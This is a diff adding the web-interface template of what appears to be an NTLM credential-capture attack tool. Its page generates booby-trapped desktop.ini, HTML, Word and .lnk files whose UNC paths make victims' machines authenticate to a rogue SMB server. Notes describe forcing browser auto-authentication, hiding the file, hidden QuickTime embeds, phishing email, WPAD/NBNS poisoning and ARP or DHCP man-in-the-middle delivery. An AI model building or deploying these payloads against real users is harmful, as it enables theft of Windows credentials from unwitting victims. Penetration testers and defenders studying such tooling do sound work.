@@ -1,0 +1,256 @@
+<%if servlet_request.query["action"] == "desktopini" then%>
+<%=ZFPayload::Desktopini.build(servlet_request.query["ip"],servlet_request.query["path"],servlet_request.query["filename"])%>
+<%elsif servlet_request.query["action"] == "html" then%>
+
+<%else%>
+<%=ZFadmingui.Header%>
+
+      	<div class="span3">
+      		
+<%#=ZFadmingui.Leftbar%>
+		</div>
+         <div class="span11">
+
+          <div class="row-fluid">
+            <div class="span4">
+              <h2>.html Generator</h2>
+              <p>Creates the HTML files for detecting user's OS and utilizing one of three methods to force browser to auto-auth.</p>
+              
+              <p><a class="btn" data-toggle="modal" href="#html">View details &raquo;</a></p>
+            </div><!--/span-->
+            <div class="span4">
+              <h2>Desktop.ini </h2>
+              <p>Creates desktop.ini file for upload to shared folder, placement on USB thumb drive or CD, or other methods of deployment.</p>
+              <p><a class="btn" data-toggle="modal" href="#desktopini">View details &raquo;</a></p>
+            </div><!--/span-->
+            <div class="span4">
+              <h2>.doc Generator</h2>
+              <p>Injection of UNC path into word .doc file (simply an HTML file for now :P). </p>
+              <p><a class="btn" data-toggle="modal" href="#worddoc">View details &raquo;</a></p>
+            </div><!--/span-->
+          </div><!--/row-->
+          <div class="row-fluid">
+            <div class="span4">
+              <h2>eMail Generator</h2>
+              <p>Creates email with HTML content containing a UNC img path. Options allow attachment of .doc and/or .html</p>
+              <p><a class="btn" data-toggle="modal" href="#email">View details &raquo;</a></p>
+            </div><!--/span-->
+            <div class="span4">
+              <h2>.lnk Shortcut</h2>
+              <p>Similar to desktop.ini files, .lnk files can have their icon set to be a unc network path.</p>
+              <p><a class="btn" data-toggle="modal" href="#lnkfile">View details &raquo;</a></p>
+            </div><!--/span-->
+            <div class="span4">
+              <h2>WSUS / Vuln Scanners</h2>
+              <p>Automated Scanners may commonly authenticate to the SMB service of it's scan range to enumerate the system info.</p>
+              <p><a class="btn" data-toggle="modal" href="#scans">View details &raquo;</a></p>
+            </div><!--/span-->
+          </div><!--/row-->
+          <div class="row-fluid">
+            <div class="span4">
+              <h2>WPAD</h2>
+              <p>Respond to searches for Web Proxy Auto Detect (WPAD)</p>
+              <p><a class="btn" data-toggle="modal" href="#wpad">View details &raquo;</a></p>
+            </div>
+            <div class="span4">
+              <h2>MITM w/ DHCP or ARP</h2>
+              <p>Inject UNC paths into network traffic using MITM attacks such as ARP Spoofing / Rogue DHCP Servers</p>
+              <p><a class="btn" data-toggle="modal" href="#mitm">View details &raquo;</a></p>
+            </div>
+            <div class="span4">
+              <h2>NBNS</h2>
+              <p>NBNS' broadcast name lookups can redirect connection requests to the rogue servers.</p>
+              <p><a class="btn" data-toggle="modal" href="#nbns">View details &raquo;</a></p>
+            </div>
+          </div>
+          <div class="row-fluid">
+            <div class="span4">
+              <h2>Quicktime</h2>
+              <p>The quicktime plugin will auto connect to UNC paths of items in a playlist</p>
+              <p><a class="btn" data-toggle="modal" href="#quicktime">View details &raquo;</a></p>
+            </div>
+          </div>
+        </div><!--/span-->
+
+<div class="modal hide fade" id="html">
+  <div class="modal-header">
+    <button type="button" class="close" data-dismiss="modal">×</button>
+    <h3>HTML File Generation</h3>
+  </div>
+  <form method="post" action="/payloads" name="html">
+  <input type="hidden" name="action" value="html">
+  <input type="hidden" name="dl" value="1">
+  <input type="hidden" name="dlname" value="file.html">
+  <div class="modal-body">
+<h4>Notes:</h4>
+<p>Web browsers will auto authenticate via NTLM in a few ways with some restrictions. As HTTP requires only IE and in a certian security context, let's focus on SMB</p>
+<pre>&lt;img src="file:////a.b.c.d/share/file.ext" width=0 height=0&gt;</pre>
+<p><b>Internet Explorer: </b> Inserting an img, js, or other object with src for a UNC path will cause the browser to auto authenticate with no prompt.</p>
+<p><b>Firefox/Chrome: </b> Doesn't auto authenticate to unc paths from websites as they respect the difference between security contexts of a domain and the file security context. Ergo, there's 2 ways we can get FF/Chrome to auto auth without prompting:</p>
+<p><ul><li>Force download by setting the http header to application/force-download. Ergo this goes into temp or file and becomes apart of the file security conext and auto-auths UNC paths.</li>
+<li>Utilize a plugin (such as quicktime) to connect to a unc path. In the case of quicktime, a playlist with an item with a UNC path will cause quicktime to auto auth.</li></ul></p>
+	<p>Coming soon will be a javascript one-liner you can include in case you inject into network traffic or get stored XSS. Right now, the auto-generate will just create a HTML file. It's up to you to host / modify as you want.</p><br>
+<h4>Generate:</h4>
+  \\<input name="ip" class="input-small" placeholder="Server IP">
+  \ <input name="path" class="input-small" placeholder="share">
+  \ <input name="filename" class="input-small" placeholder="filename">
+  <input type="submit" value="Geneate Payload">
+
+  </div>
+  </form>
+</div>
+        
+<div class="modal hide fade" id="desktopini">
+  <div class="modal-header">
+    <button type="button" class="close" data-dismiss="modal">×</button>
+    <h3>Desktop.ini Generation</h3>
+  </div>
+  <form method="post" action="/payloads" name="desktopini">
+  <input type="hidden" name="action" value="desktopini">
+  <input type="hidden" name="dl" value="1">
+  <input type="hidden" name="dlname" value="desktop.ini">
+  <div class="modal-body">
+<h4>Notes:</h4>
+<p>The desktop.ini file sets the folder icon to be a UNC network path causing a rogue to connect to a smb server.</p>
+<p>If you want to hide it, you can set the attribute to hidden as:
+<pre>
+attrib +h desktop.ini
+</pre></p><br>
+<h4>Generate:</h4>
+  \\<input name="ip" class="input-small" placeholder="Server IP">
+  \ <input name="path" class="input-small" placeholder="share">
+  \ <input name="filename" class="input-small" placeholder="filename">
+  <input type="submit" value="Geneate Payload">
+
+  </div>
+  </form>
+</div>
+
+<div class="modal hide fade" id="worddoc">
+  <div class="modal-header">
+    <button type="button" class="close" data-dismiss="modal">×</button>
+    <h3>Word Doc Generation</h3>
+  </div>
+  <form method="post" action="/payloads" name="worddoc">
+  <input type="hidden" name="action" value="worddoc">
+  <input type="hidden" name="dl" value="1">
+  <input type="hidden" name="dlname" value="word.doc">
+  <div class="modal-body">
+<h4>Notes:</h4>
+<p>Office suite tools will auto connect to SMB paths to obtain embeded items (such as images).</p>
+<p>For now, this generator will create an HTML file with an image with a UNC path and rename it to .doc. Customise as you see fit.</p><br>
+<h4>Generate:</h4>
+  \\<input name="ip" class="input-small" placeholder="Server IP">
+  \ <input name="path" class="input-small" placeholder="share">
+  \ <input name="filename" class="input-small" placeholder="filename">
+  <input type="submit" value="Geneate Payload">
+
+  </div>
+  </form>
+</div>
+
+
+<div class="modal hide fade" id="nbns">
+  <div class="modal-header">
+    <button type="button" class="close" data-dismiss="modal">×</button>
+    <h3>Services querying by NBNS</h3>
+  </div>
+  <div class="modal-body">
+<h4>Notes:</h4>
+<p>Responding to NBNS requests can either get IE to auto authenticate to one word name lookups or respond to requests for names such as file shares and get clients to auto auth to the rogue file server.</p>
+<br>
+  </div>
+</div>
+
+
+<div class="modal hide fade" id="quicktime">
+  <div class="modal-header">
+    <button type="button" class="close" data-dismiss="modal">×</button>
+    <h3>Quicktime</h3>
+  </div>
+  <div class="modal-body">
+<h4>Notes:</h4>
+<p>Quicktime (especially the quicktime plugin for FF/Chrome) will auto authenticate to UNC network paths in quicktime playlists (m3us)</p>
+<p>For embeding into HTML files...
+<pre>
+Please hold while this page "loads" ;) ....
+&lt;object height="1" width="1"&gt;
+&lt;param name="kioskmode" value="true"&gt;
+&lt;param name="src" value="test.m3u"&gt;
+&lt;param name="autoplay" value="false"&gt;
+&lt;param name="controller" value="true"&gt;
+&lt;embed height="50" src="test.m3u" type="video/quicktime" width="200" controller="true" autoplay="true" kioskmode="true"&gt;
+&lt;/object&gt;
+</pre></p><br>
+  </div>
+</div>
+
+<div class="modal hide fade" id="mitm">
+  <div class="modal-header">
+    <button type="button" class="close" data-dismiss="modal">×</button>
+    <h3>Injection and Redirection of Traffic via MITM Attacks</h3>
+  </div>
+  <div class="modal-body">
+<h4>Notes:</h4>
+<p>Attackers who can gain a MITM foothold via ARP spoofing, rogue DHCP server, or other ways can redirect auth requests to the rogue server or inject into the HTTP traffic the HTML payloads.</p><br>
+  </div>
+</div>
+
+
+<div class="modal hide fade" id="wpad">
+  <div class="modal-header">
+    <button type="button" class="close" data-dismiss="modal">×</button>
+    <h3>Systems querying by WPAD</h3>
+  </div>
+  <div class="modal-body">
+<h4>Notes:</h4>
+<p>Web Proxy Auto Detect (WPAD) is utilized by Windows and Web Browsers to determine if a proxy exists on the network by querying DNS and NBNS for WPAD and look for a proxy config file. IE as well as windows host (for windows update) automatically auths with NTLM.</p>
+<p>The system searches for the DNS name for WPAD in the following order:</p>
+<p><ul><li>wpad.domain.name.tld</li><li>wpad.name.tld</li><li>NBNS broadcast lookup for WPAD</li></ul></p>
+<p>To exploit, position yourself as a DNS entry in any of these paths, or setup a rogue NBNS server to respond to NBNS requests for WPAD</p><br>
+  </div>
+</div>
+
+
+<div class="modal hide fade" id="scans">
+  <div class="modal-header">
+    <button type="button" class="close" data-dismiss="modal">×</button>
+    <h3>Network Inventory / Vuln Scans</h3>
+  </div>
+  <div class="modal-body">
+<h4>Notes:</h4>
+<p>Automated scanners will connect over SMB to enumerate the client target for inventory checks. This is typically done via NTLM.</p>
+<p><ul><li>WSUS</li><li>Nessus</li><li>Qualys</li></ul></p><p>More to come with more confirmation.</p><br>
+  </div>
+</div>
+
+
+<div class="modal hide fade" id="email">
+  <div class="modal-header">
+    <button type="button" class="close" data-dismiss="modal">×</button>
+    <h3>EMail Generation</h3>
+  </div>
+  <div class="modal-body">
+<h4>Notes:</h4>
+<p>Auto generation is coming in a near future version. For now though....</p>
+<p>There are a few ways to get clients to auto authenticate with a social engineering attack over email.</p>
+<p><ul><li>HTML emails with an IMG with unc path as the src</li>
+<li>Attachments of a HTML file (local security context) or Word Doc.</li></ul></p><br>
+  </div>
+</div>
+
+
+<div class="modal hide fade" id="lnkfile">
+  <div class="modal-header">
+    <button type="button" class="close" data-dismiss="modal">×</button>
+    <h3>Windows lnk Shortcut Files</h3>
+  </div>
+  <div class="modal-body">
+<h4>Notes:</h4>
+<p>LNK files are similar to desktop.ini files in which you can set the icon to point to a UNC path.</p>
+<p>For now, figure it out - it's not hard :) Walkthrough coming soon.</p><br>
+  </div>
+</div>
+
+<%=ZFadmingui.Footer%>
+<%end%>
